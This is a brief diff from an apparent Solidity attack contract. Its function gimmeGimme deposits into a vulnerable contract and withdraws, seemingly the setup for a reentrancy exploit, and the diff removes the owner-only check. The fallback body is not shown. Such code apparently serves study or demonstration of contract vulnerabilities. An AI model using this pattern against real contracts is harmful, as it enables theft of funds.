@@ -27,11 +27,8 @@ contract attack
 
     function gimmeGimme() public payable 
     {
-        if (msg.sender == owner)
-        {
-            vuln_cont.deposit.value(0.01 ether)();
-            vuln_cont.withdraw();
-        }
+        vuln_cont.deposit.value(0.01 ether)();
+        vuln_cont.withdraw();
     }
 
     fallback () external payable 
